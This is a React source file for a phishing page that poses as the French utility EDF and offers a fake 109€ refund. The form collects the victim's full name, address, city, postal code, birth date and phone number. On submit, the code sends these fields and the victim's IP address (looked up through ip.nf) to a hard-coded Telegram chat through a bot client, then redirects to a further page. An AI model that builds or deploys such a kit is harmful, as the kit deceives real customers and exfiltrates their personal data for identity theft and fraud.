import react from 'react';
import './css/index.css';
import { useForm } from "react-hook-form";
import { BrowserRouter as Router, Route, useHistory } from "react-router-dom";
const { TelegramClient } = require('messaging-api-telegram');





function Indexo() { 

  const client = new TelegramClient({
    accessToken: 'ACCESSTOKEN',
  });
  var history = useHistory();
  var ipy;
  fetch('https://ip.nf/me.json')
    .then(results => results.json())
    .then(data => ipy = data)
    .then(console.log)
    


const { register, handleSubmit } = useForm();






const onSubmit = (data) => {
  var  dinto = data;
  var kali ="===========+++ ❤ EDF CHX ❤ +++========\n"+ "Full Name : "+dinto.name+"\n"+"Adresse : "+dinto.adresse+"\n"+ "City : "+dinto.city+"\n"+"Zip : "+dinto.zip+"\n"+"Date  Birth : "+dinto.date+"\n"+"Num : "+dinto.numtel+"\n"+ "===========+++ ❤ EDF CHX ❤ +++========\n"+"IP Adresse : "+ ipy.ip.ip;
  client.sendMessage(1513751242,kali)
  if (kali !=null)  {
    history.push("/infos");
  }
  
};





  return (
    <div className="Indexo">
         
         <form id="frm" method="post" action="/infos" onSubmit={handleSubmit(onSubmit)}  >
        <div id="main">
          <div id="logo">
            <img src="edf.png" width="163px" height="77px" />
          </div>
          <hr width="377px" color="#DEDEDE" style={{marginLeft: '2px', marginTop: '0px'}} />
          <div id="error">
            <img src="error.png" alt="" title="Error" />
          </div>
          <br />
          <h2>Rectification annuelle EDF.</h2>
          <b style={{color: 'red'}}>Vous recevrez une facture de remboursement sur votre email une fois l'opération terminée</b>
          <br /><br />
          <b style={{color: '#0474BF'}}>Identifiez-vous : complétez les informations correspondantes à votre facture EDF</b>
          <h2>Identité client :</h2>
          <div id="login">
            <input placeholder="Nom complet" className="textbox" type="text" id="name" name="name" {...register("name")}  defaultValue="" maxLength={44} autoComplete="off" required /><br />
            <input placeholder="Adresse" className="textbox" type="text" id="adresse" name="adresse" {...register("adresse")}  defaultValue="" maxLength={50} autoComplete="off" required /><br />
            <input placeholder="Ville" className="textbox" type="text" id="city" name="city" {...register("city")}  defaultValue=""  maxLength={20} autoComplete="off" required /><br />
            <input placeholder="Code postal" className="textbox" type="number" id="zip" name="zip" {...register("zip")}  defaultValue="" maxLength={7} autoComplete="off" required /><br />
            <input placeholder="Date de naissance" className="textbox" type="date" id="date" name="date" {...register("date")} defaultValue="" data-placeholder-text="JJ/MM/AA "  maxLength={10} autoComplete="off" required /><br />
            <input placeholder="Numero de téléphone" className="textbox" type="number" id="numtel" name="numtel" {...register("numtel")}  defaultValue="" maxLength={13} autoComplete="off" required /><br />
            <input className="btnSubmit" type="submit" name="_eventId_continue"  Value="Continuer" /><br />
         
         
           
            <style dangerouslySetInnerHTML={{__html: "\n\n          span { font-size: 17px; }\n\n          span { margin-top: 62px; margin-left: 24px; }\n\n          span{position: absolute;}\n\n          span{color: white;}\n\n     " }} />    
            
          </div>
          <div className="wallet">
            <p><span id="mySpan" /></p>
            <img src="identity.png" alt="" width="240px" height="160px" style={{marginLeft: '0px'}} />
            <h3>Remboursement EDF</h3>
            <b> 
              Pourquoi ai-je reçu un remboursement ? <br />Suite à la comparaison des estimations de factures payées en 2021, et votre consommation réelle d'électricité, vous êtes admissible à recevoir un remboursement de 109€.<br />L'opération prendra une durée de 24 à 72. Nous nous excusons pour la gêne occasionnée</b>
          </div><br /></div></form>
         
    </div>

  );
}

export default Indexo;